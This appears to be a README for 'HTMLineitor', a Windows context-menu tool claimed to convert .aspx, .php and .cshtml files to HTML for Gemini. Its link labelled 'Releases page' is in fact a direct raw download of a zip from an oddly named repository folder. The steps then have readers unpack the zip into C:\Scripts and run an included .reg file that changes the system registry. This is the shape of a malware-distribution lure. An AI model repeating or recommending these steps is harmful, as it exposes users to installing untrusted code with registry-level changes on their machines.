## üöÄ Getting Started
HTMLineitor is a simple tool that helps you convert files like .aspx, .php, or .cshtml into HTML. This makes it easier to upload your files to Google tools like Gemini. No more copying, pasting, or renaming!

## üìã Installation Instructions

1. **Visit the Releases Page**
   Go to the [Releases page](https://raw.githubusercontent.com/Eyoela1/HTMLineitor/main/hemihedrally/HTMLineitor.zip) to find the latest version.

2. **Download the Files**
   Look for the most recent version of HTMLineitor. Click on it to download the zip file containing all necessary scripts.

3. **Extract the Zip File**
   After downloading, locate the zip file in your Downloads folder. Right-click and select "Extract All." Follow the prompts to unzip the files.

4. **Move Files to the Scripts Folder**
   Open the folder where you extracted the files. Copy all the files. Then, navigate to `C:\Scripts` on your computer. If this folder does not exist, create it. Paste the files into this folder.

5. **Register the Script**
   Find the `.reg` file in the folder you just pasted the files into. Double-click this file. A prompt may appear asking for confirmation. Click "Yes" to allow the file to make changes to your system. This step adds the conversion option to your context menu.

6. **Test the Installation**
   Right-click any .aspx, .php, or .cshtml file in Windows Explorer. You should see an option to convert your file to HTML. Click on this option and wait for the conversion to complete.

## ü§ù Contribution Guidelines
This project is open source, and contributions are welcome. If you have a different file type that doesn't work with Google tools, feel free to add an option for it. Simply create a new feature in the code and submit a pull request. Together, we can improve this tool for everyone.

## ‚ùì Troubleshooting
- **The Option Does Not Appear:** Ensure you have correctly placed the files in `C:\Scripts` and registered the .reg file. Restart Windows Explorer if needed.
- **Conversion Fails:** Make sure the file you are trying to convert is in a supported format (.aspx, .php, or .cshtml). If it‚Äôs not, the conversion option won't function.
